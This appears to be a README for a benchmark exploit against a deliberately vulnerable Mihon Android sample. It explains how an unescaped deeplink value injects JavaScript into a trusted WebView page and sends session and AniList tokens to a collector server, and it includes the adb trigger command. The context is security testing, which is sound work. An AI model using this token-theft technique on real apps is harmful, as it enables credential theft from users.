# EXP: 1.3 Dynamic Script Injection Risk

This EXP targets the Mihon WebViewBench sample:

```text
1.3_Dynamic_Script_Injection_Risk
```

The vulnerable app loads the official reader notice page:

```text
https://mihon.app/help/reader-notice
```

and then builds JavaScript with an unescaped `notice` value:

```text
window.onMihonReaderNotice('<notice>')
```

The generated deeplink injects JavaScript through `notice`, calls the trusted-page bridge, and sends the result to the collector.

## Files

```text
collect_server.py      Receives leaked bridge data at /collect?d=<data>
generate_deeplink.py   Builds the vulnerable mihon://help/webview deeplink and adb command
received/              Output directory created by the collector
```

## Prerequisites

1. Install the vulnerable APK built from:

```text
apps/mihon-0.19.9/samples/1.3_Dynamic_Script_Injection_Risk
```

2. Start the official reader notice server from:

```text
apps/mihon-0.19.9/server/1.3_Dynamic_Script_Injection_Risk
```

3. Map `mihon.app` to the official local server in the test environment.

4. For the official HTTPS URL, make sure the test device trusts the certificate used by the official local server. This EXP does not bypass TLS; TLS bypass belongs to another sample.

## Start Collector

For Android emulator tests, `10.0.2.2` normally points back to the host machine:

```powershell
python .\collect_server.py --host 0.0.0.0 --port 8000
```

Received data is written to:

```text
received/collected_<timestamp>.txt
```

## Generate Trigger

```powershell
python .\generate_deeplink.py --collector http://10.0.2.2:8000
```

The script prints:

```text
adb shell am start -a android.intent.action.VIEW -d "<deeplink>"
```

Run the printed adb command against the device or emulator.

## Expected Result

The collector receives a string containing values read through the trusted-page bridge, for example:

```text
source=Bearer benchmark-mihon-source-session&anilist=benchmark-anilist-reader-token
```

This demonstrates that the injected `notice` script executed in the trusted `mihon.app` page context and accessed `window.mihonAndroidBridge`.
